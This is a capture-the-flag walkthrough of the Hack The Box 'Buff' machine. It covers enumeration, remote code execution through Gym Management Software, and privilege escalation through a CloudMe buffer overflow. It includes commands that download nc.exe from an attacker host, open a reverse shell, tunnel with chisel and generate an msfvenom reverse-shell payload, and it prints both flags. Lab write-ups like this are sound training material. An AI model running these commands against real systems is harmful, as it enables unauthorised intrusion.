# HTB Walkthrough - Buff

**Machine Name**: Buff  
**Target IP**: 10.129.2.18  
<img width="1270" height="764" alt="webpage" src="https://github.com/user-attachments/assets/2423fc7a-e049-433a-a7da-4571c4044621" />

---

## 🧭 Enumeration

### 🔍 Nmap Scan

```bash
nmap -sV -sC -oA nmap/Buff 10.129.2.18
```

**Results:**

```
PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
```

## 🌐 Web Enumeration

- Website accessible at: http://10.129.2.18:8080
- Title: `mrb3n's Bro Hut`
- Software identified: **Gym Management Software 1.0**

<img width="1270" height="764" alt="gym-ui" src="https://github.com/user-attachments/assets/43d7599e-10ea-4763-9304-58439dfb2c66" />

## ⚙️ Exploitation (RCE via Gym Management Software)

[Exploit Reference - EDB 48506](https://www.exploit-db.com/exploits/48506)

```bash
python2 exploit.py http://10.129.2.18:8080/
```

**Initial Shell Gained.**

---

## 🪪 User Flag

```bash
type ..\..\..\..\Users\shaun\Desktop\user.txt
```

**Flag:** `4277a01cb57aa37a5e6aeeb90deb91c4`

---

## ⚙️ Reverse Shell Upgrade

```bash
# Host on attack box
python3 -m http.server 80

# On victim
powershell Invoke-WebRequest -Uri http://10.10.14.156/nc.exe -Outfile C:\Users\Public\nc.exe
C:\Users\Public\nc.exe 10.10.14.156 4444 -e cmd.exe
```

---

## 🧭 Privilege Escalation

### 🔍 winPEAS Findings

- Detected service: `CloudMe` running on `127.0.0.1:8888`
- Vulnerable to buffer overflow ([EDB 48389](https://www.exploit-db.com/exploits/48389))

---

## 🔁 Port Forwarding

**Using chisel:**

```bash
# On attacker machine
chisel server -p 8000 --reverse

# On victim
chisel.exe client 10.10.14.156:8000 R:8888:127.0.0.1:8888
```

---

## 💥 Exploiting CloudMe

1. Generate payload:

```bash
msfvenom -a x86 -p windows/shell_reverse_tcp LHOST=10.10.14.156 LPORT=7777 -b "\x00\x0a\x0d" -f python -v payload
```

2. Inject payload into CloudMe exploit script and run:

```bash
python3 cloudme_exploit.py
```

---

## 👑 Root Access

```bash
whoami
# buff\administrator

type C:\Users\Administrator\Desktop\root.txt
```

**Flag:** `1d8332fbbb42c15032013d5e2fdd2655`
